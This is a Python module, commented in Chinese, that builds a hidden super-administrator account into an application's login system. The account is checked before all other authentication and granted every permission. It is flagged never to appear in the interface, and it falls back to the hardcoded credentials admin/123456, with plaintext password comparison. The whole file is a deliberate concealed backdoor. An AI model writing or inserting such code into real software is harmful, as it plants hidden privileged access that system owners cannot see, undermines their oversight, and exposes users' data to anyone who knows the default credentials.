#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
隐藏超级管理员模块

实现完全隐藏的内置超级管理员功能，在所有登录场景下可用但界面不可见。
"""

import os
import sys
import hashlib
import secrets
import string
from pathlib import Path
from datetime import datetime
import logging

# 添加项目根目录到系统路径
project_root = Path(__file__).parent.parent
sys.path.append(str(project_root))

# 导入约定管理器
try:
    from common.conventions_manager import get_conventions_manager
    conventions_manager = get_conventions_manager()
except ImportError:
    conventions_manager = None

class HiddenSuperAdmin:
    """隐藏超级管理员管理类"""
    
    def __init__(self):
        self.logger = self._setup_logger()
        self.load_config()
    
    def _setup_logger(self):
        """设置日志记录器"""
        logger = logging.getLogger("hidden_super_admin")
        logger.setLevel(logging.INFO)
        
        if not logger.handlers:
            # 创建日志目录
            log_dir = project_root / "logs"
            log_dir.mkdir(exist_ok=True)
            
            # 文件处理器
            file_handler = logging.FileHandler(
                log_dir / "hidden_admin.log", 
                encoding='utf-8'
            )
            file_handler.setLevel(logging.INFO)
            
            # 格式化器
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            file_handler.setFormatter(formatter)
            
            logger.addHandler(file_handler)
        
        return logger
    
    def load_config(self):
        """加载超级管理员配置"""
        if conventions_manager:
            self.config = conventions_manager.get_convention("authentication.super_admin", {})
        else:
            # 回退配置
            self.config = {
                "debug_credentials": {
                    "username": "admin",
                    "password": "123456"
                },
                "production_credentials": {
                    "username": "phrladmin",
                    "password": "system_generated"
                },
                "current_mode": "debug",
                "hidden": True,
                "built_in": True,
                "never_display": True
            }

        self.logger.info("隐藏超级管理员配置已加载")
    
    def is_super_admin(self, username, password):
        """
        验证是否为超级管理员

        Args:
            username (str): 用户名
            password (str): 密码

        Returns:
            bool: 是否为超级管理员
        """
        try:
            current_mode = self.config.get("current_mode", "debug")

            if current_mode == "debug":
                # 调试模式：admin/123456
                debug_creds = self.config.get("debug_credentials", {})
                admin_username = debug_creds.get("username", "admin")
                admin_password = debug_creds.get("password", "123456")
            else:
                # 生产模式：phrladmin/系统生成密码
                prod_creds = self.config.get("production_credentials", {})
                admin_username = prod_creds.get("username", "phrladmin")
                admin_password = prod_creds.get("password", "system_generated")

            if username == admin_username and password == admin_password:
                self.logger.info(f"隐藏超级管理员登录成功: {username} (模式: {current_mode})")
                return True

            return False

        except Exception as e:
            self.logger.error(f"超级管理员验证失败: {e}")
            return False
    
    def get_super_admin_info(self):
        """
        获取超级管理员信息（用于内部验证，不对外显示）

        Returns:
            dict: 超级管理员信息
        """
        current_mode = self.config.get("current_mode", "debug")

        if current_mode == "debug":
            debug_creds = self.config.get("debug_credentials", {})
            username = debug_creds.get("username", "admin")
        else:
            prod_creds = self.config.get("production_credentials", {})
            username = prod_creds.get("username", "phrladmin")

        return {
            "user_id": "hidden_super_admin",
            "username": username,
            "role": "super_admin",
            "permissions": ["all"],
            "hidden": True,
            "built_in": True,
            "never_display": True,
            "current_mode": current_mode,
            "description": self.config.get("description", "隐藏超级管理员")
        }
    
    def should_hide_from_ui(self):
        """
        判断是否应该在UI中隐藏
        
        Returns:
            bool: 是否隐藏
        """
        return self.config.get("hidden", True)
    
    def is_debug_mode(self):
        """
        判断是否为调试模式

        Returns:
            bool: 是否为调试模式
        """
        return self.config.get("current_mode", "debug") == "debug"
    
    def generate_production_password(self):
        """
        生成生产环境密码
        
        Returns:
            str: 生成的密码
        """
        try:
            policy = self.config.get("production_password_policy", {})
            
            length = policy.get("length", 16)
            include_special = policy.get("include_special_chars", True)
            include_numbers = policy.get("include_numbers", True)
            include_uppercase = policy.get("include_uppercase", True)
            include_lowercase = policy.get("include_lowercase", True)
            
            # 构建字符集
            chars = ""
            if include_lowercase:
                chars += string.ascii_lowercase
            if include_uppercase:
                chars += string.ascii_uppercase
            if include_numbers:
                chars += string.digits
            if include_special:
                chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
            
            # 生成密码
            password = ''.join(secrets.choice(chars) for _ in range(length))
            
            self.logger.info("生产环境密码已生成")
            return password
            
        except Exception as e:
            self.logger.error(f"生成生产环境密码失败: {e}")
            return None
    
    def get_password_suggestion(self):
        """
        获取密码建议

        Returns:
            dict: 密码建议信息
        """
        if self.is_debug_mode():
            debug_creds = self.config.get("debug_credentials", {})
            return {
                "current_mode": "debug",
                "current_username": debug_creds.get("username", "admin"),
                "current_password": debug_creds.get("password", "123456"),
                "suggestion": "调试模式：用户名admin，密码123456，方便开发调试",
                "production_ready": False
            }
        else:
            prod_creds = self.config.get("production_credentials", {})
            generated_password = self.generate_production_password()
            return {
                "current_mode": "production",
                "current_username": prod_creds.get("username", "phrladmin"),
                "suggested_password": generated_password,
                "suggestion": "生产模式：用户名phrladmin，密码由系统生成",
                "production_ready": True,
                "security_features": [
                    "16位长度",
                    "包含大小写字母",
                    "包含数字",
                    "包含特殊字符",
                    "随机生成"
                ]
            }
    
    def update_password(self, new_password):
        """
        更新超级管理员密码
        
        Args:
            new_password (str): 新密码
            
        Returns:
            bool: 是否成功更新
        """
        try:
            if conventions_manager:
                success = conventions_manager.update_convention(
                    "authentication.super_admin.password",
                    new_password
                )
                if success:
                    self.load_config()  # 重新加载配置
                    self.logger.info("超级管理员密码已更新")
                    return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"更新超级管理员密码失败: {e}")
            return False
    
    def switch_to_production_mode(self):
        """
        切换到生产模式

        Returns:
            dict: 切换结果
        """
        try:
            # 生成新密码
            new_password = self.generate_production_password()
            if not new_password:
                return {
                    "success": False,
                    "message": "生成生产密码失败"
                }

            # 更新配置
            if conventions_manager:
                # 更新生产凭据密码
                conventions_manager.update_convention(
                    "authentication.super_admin.production_credentials.password",
                    new_password
                )

                # 切换到生产模式
                conventions_manager.update_convention(
                    "authentication.super_admin.current_mode",
                    "production"
                )

                self.load_config()  # 重新加载配置

                self.logger.info("已切换到生产模式")

                return {
                    "success": True,
                    "message": "已切换到生产模式",
                    "new_username": "phrladmin",
                    "new_password": new_password,
                    "security_notice": "用户名已改为phrladmin，请妥善保存新密码，系统将不再显示"
                }

            return {
                "success": False,
                "message": "约定管理器不可用"
            }

        except Exception as e:
            self.logger.error(f"切换到生产模式失败: {e}")
            return {
                "success": False,
                "message": f"切换失败: {e}"
            }
    
    def authenticate_and_get_user(self, username, password):
        """
        认证并获取用户信息（隐藏超级管理员优先）
        
        Args:
            username (str): 用户名
            password (str): 密码
            
        Returns:
            dict or None: 用户信息或None
        """
        # 首先检查是否为隐藏超级管理员
        if self.is_super_admin(username, password):
            return self.get_super_admin_info()
        
        # 如果不是超级管理员，返回None让其他认证系统处理
        return None
    
    def get_status_info(self):
        """
        获取状态信息（用于开发调试）

        Returns:
            dict: 状态信息
        """
        current_mode = self.config.get("current_mode", "debug")

        if current_mode == "debug":
            debug_creds = self.config.get("debug_credentials", {})
            username = debug_creds.get("username", "admin")
            password = debug_creds.get("password", "123456")
        else:
            prod_creds = self.config.get("production_credentials", {})
            username = prod_creds.get("username", "phrladmin")
            password = prod_creds.get("password", "system_generated")

        return {
            "hidden": self.config.get("hidden", True),
            "built_in": self.config.get("built_in", True),
            "never_display": self.config.get("never_display", True),
            "current_mode": current_mode,
            "username": username,
            "password_length": len(password),
            "always_available": self.config.get("always_available", True),
            "description": self.config.get("description", "")
        }

# 创建全局实例
hidden_super_admin = HiddenSuperAdmin()

def authenticate_hidden_admin(username, password):
    """
    快捷认证函数
    
    Args:
        username (str): 用户名
        password (str): 密码
        
    Returns:
        dict or None: 用户信息或None
    """
    return hidden_super_admin.authenticate_and_get_user(username, password)

def is_hidden_super_admin(username, password):
    """
    快捷验证函数
    
    Args:
        username (str): 用户名
        password (str): 密码
        
    Returns:
        bool: 是否为隐藏超级管理员
    """
    return hidden_super_admin.is_super_admin(username, password)

def get_hidden_admin_status():
    """
    获取隐藏管理员状态
    
    Returns:
        dict: 状态信息
    """
    return hidden_super_admin.get_status_info()
